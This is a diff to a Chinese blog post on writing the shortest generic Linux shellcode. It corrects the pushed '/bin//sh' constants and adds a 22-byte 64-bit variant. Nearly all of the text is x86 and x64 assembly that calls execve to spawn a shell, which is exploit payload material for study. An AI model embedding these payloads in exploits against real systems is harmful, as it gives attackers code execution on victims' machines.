@@ -12,7 +12,7 @@ tags:
  
 ---
 
-在寄存器都是非理想值情况下(shellcode可根据环境具体触发时寄存器的值做长度调整)，我本着最优通用的原则，捣鼓了Linux下32位和64位最短通用shellcode的编写
+在寄存器都是非理想值情况下(shellcode可根据环境具体触发时寄存器的值做长度调整)，我本着最优通用的原则，整理了Linux下32位和64位最短通用shellcode的编写
 
 ## 32位
 
@@ -36,7 +36,7 @@ tags:
 	mul ecx
 	push eax
 	mov al,0xb
-	push 0x68732f   
+	push 0x68732f2f   
 	push 0x6e69622f   
 	mov ebx,esp
 	int 0x80
@@ -47,21 +47,33 @@ tags:
 	xor ecx,ecx
 	xor edx,edx
 	push edx
-	push "//sh"
-	push "/bin"
+	push 0x68732f2f
+	push 0x6e69622f
 	mov ebx,esp
 	xor eax,eax
-	mov al,0Bh
-	int 80h
+	mov al,0xB
+	int 0x80
 
 ## 64位
+
+
+最短有"\x00" 22 byte
+
+	xor rsi,rsi
+	mul esi
+	mov rbx,0x68732f6e69622f
+	push rbx
+	push rsp
+	pop rdi
+	mov al, 59
+	syscall
 
 最短无"\x00" 23 byte
 
 	xor rsi,rsi
 	mul esi
 	push rax
-	mov rbx,0x68732f6e69622f2f
+	mov rbx,0x68732f2f6e69622f
 	push rbx
 	push rsp
 	pop rdi
